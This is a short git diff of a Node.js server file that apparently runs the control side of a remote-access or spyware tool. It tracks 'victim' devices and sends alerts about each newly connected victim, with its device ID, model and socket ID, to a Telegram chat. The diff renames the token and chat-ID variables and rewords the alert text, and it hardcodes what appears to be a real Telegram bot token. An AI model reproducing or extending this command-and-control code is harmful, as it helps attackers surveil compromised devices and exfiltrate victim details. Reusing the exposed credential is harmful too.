@@ -15,9 +15,9 @@ const victimData = {};
 let adminSocketId = null;
 
 
-const TELEGRAM_BOT_TOKEN = '7265828067:AAFtQrVCMPfvQoE9mlzKAVoULsHDyShpQS0';
-const TELEGRAM_CHAT_ID = ' add chat id';
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+const botoken= '7265828067:AAFtQrVCMPfvQoE9mlzKAVoULsHDyShpQS0';
+const Chatid = 'add chat id';
+const bot = new TelegramBot(botoken, { polling: false });
 
 server.listen(process.env.PORT || port, (err) => {
   if (err) return;
@@ -109,12 +109,12 @@ const log = (message) => {
 
 
 const sendTelegramNotification = (device) => {
-  const message = `📡 *New Victim Connected*\n\n` +
+  const message = `📡 *Victim online 🟢*\n\n` +
     `🔹 *Device ID:* \`${device.id}\`\n` +
     `🔹 *Model:* ${device.model}\n` +
     `🔹 *Socket ID:* \`${device.socketId}\``;
 
-  bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' })
+  bot.sendMessage(Chatid, message, { parse_mode: 'Markdown' })
     .then(() => log('Notifying to Server'))
     .catch((err) => log('Telegram Error: ' + err));
 };
